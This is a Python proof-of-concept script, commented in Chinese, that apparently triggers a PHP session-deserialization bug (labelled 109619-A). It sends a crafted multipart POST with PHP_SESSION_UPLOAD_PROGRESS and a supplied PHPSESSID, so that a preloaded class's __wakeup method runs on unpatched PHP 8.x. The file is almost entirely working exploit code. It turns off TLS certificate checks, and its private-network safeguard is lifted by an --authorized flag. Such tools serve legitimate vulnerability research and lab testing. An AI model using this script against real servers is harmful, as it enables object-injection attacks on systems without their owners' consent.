#!/usr/bin/env python3
"""109619-A 触发客户端：启动期会话解码 → 目标类的 __wakeup 被执行。

前置（靶机侧）：
  * 未修复的 PHP 8.2/8.3/8.4/8.5（或 <=8.1）
  * opcache.preload 指向一个定义了带魔术方法的类的脚本
  * session 里存在该类的对象（应用写入，或实验室里手工写入 session 文件）

本脚本只负责"发一次带 PHP_SESSION_UPLOAD_PROGRESS 的 multipart"，
不写目标磁盘、不猜路径，因此可以安全地对授权目标使用。

用法：
  python3 poc_109619_wakeup.py --url http://127.0.0.1:8099/index.php --sid <32位ID>
  python3 poc_109619_wakeup.py --url ... --sid ... --authorized   # 允许公网目标
"""
from __future__ import annotations
import argparse, ipaddress, socket, ssl, sys, uuid
import urllib.error, urllib.parse, urllib.request

UA = "Mozilla/5.0 (compatible; 109619-check/1.0)"
CTX = ssl.create_default_context(); CTX.check_hostname = False; CTX.verify_mode = ssl.CERT_NONE

def private(host: str) -> bool:
    try:
        for _, _, _, _, sa in socket.getaddrinfo(host, None):
            ip = ipaddress.ip_address(sa[0])
            if not (ip.is_private or ip.is_loopback or ip.is_link_local):
                return False
        return True
    except OSError:
        return False

def build(progress_name: str) -> tuple[bytes, str]:
    b = "----" + uuid.uuid4().hex[:12]
    body = (f"--{b}\r\nContent-Disposition: form-data; name=\"PHP_SESSION_UPLOAD_PROGRESS\"\r\n\r\n{progress_name}\r\n"
            f"--{b}\r\nContent-Disposition: form-data; name=\"f\"; filename=\"a.txt\"\r\n"
            f"Content-Type: text/plain\r\n\r\nAB\r\n--{b}--\r\n").encode()
    return body, f"multipart/form-data; boundary={b}"

def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--url", required=True, help="任意 PHP 页面（不需要调用 session_start）")
    ap.add_argument("--sid", required=True, help="32 位字母数字会话 ID")
    ap.add_argument("--name", default="x", help="PHP_SESSION_UPLOAD_PROGRESS 的值")
    ap.add_argument("--authorized", action="store_true")
    ap.add_argument("--timeout", type=float, default=10)
    a = ap.parse_args()

    host = urllib.parse.urlparse(a.url).hostname or ""
    if not a.authorized and not private(host):
        sys.exit(f"[!] {host} 不在私网范围；确认授权后加 --authorized")

    body, ctype = build(a.name)
    req = urllib.request.Request(a.url, data=body, method="POST", headers={
        "User-Agent": UA, "Content-Type": ctype, "Cookie": f"PHPSESSID={a.sid}"})
    try:
        with urllib.request.urlopen(req, timeout=a.timeout, context=CTX) as r:
            status, data = r.status, r.read(256)
    except urllib.error.HTTPError as e:
        status, data = e.code, b""
    except Exception as e:
        sys.exit(f"[!] 请求失败: {e}")

    print(f"[*] POST {a.url}")
    print(f"[*] sid={a.sid} status={status}")
    if data:
        print(f"[*] body[:120]={data[:120]!r}")
    print("[*] 若靶机侧 proof 文件出现内容，说明 __wakeup 已在启动期执行")

if __name__ == "__main__":
    main()
